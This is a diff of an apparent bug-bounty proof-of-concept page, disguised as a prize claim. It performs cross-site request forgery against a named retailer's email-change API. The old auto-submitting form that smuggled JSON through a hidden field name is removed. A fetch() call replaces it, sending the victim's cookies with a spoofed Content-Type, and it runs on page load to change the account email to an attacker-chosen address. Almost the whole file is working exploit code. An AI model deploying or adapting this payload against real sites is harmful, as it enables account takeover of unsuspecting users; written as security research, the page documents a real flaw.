@@ -4,16 +4,20 @@
 <body>
     <h1>Claiming Prize...</h1>
 
-    <form id="exploit-form" action="https://www.boozt.com/eu/en/api/customer/profile/email/change" method="POST"
-        enctype="text/plain">
-
-        <input type="hidden" name='{"email":"' value='","email":"absolutexon+won@wearehackerone.com"}'>
-
-        <input type="submit" value="Claim">
-    </form>
-
     <script>
-        document.getElementById('exploit-form').submit();
+        // We use fetch to spoof the Content-Type
+        fetch("https://www.boozt.com/eu/en/api/customer/profile/email/change", {
+            method: "POST",
+            mode: "no-cors",
+            credentials: "include", // Sends your cookies
+            headers: {
+                // We lie to the server. The browser accepts this header in no-cors mode.
+                "Content-Type": "multipart/form-data"
+            },
+            // We put the JSON here. 
+            // The server sees the header, accepts the request, then sniffs the JSON body.
+            body: '{"email":"absolutexon+spoof@wearehackerone.com"}'
+        });
     </script>
 </body>
 
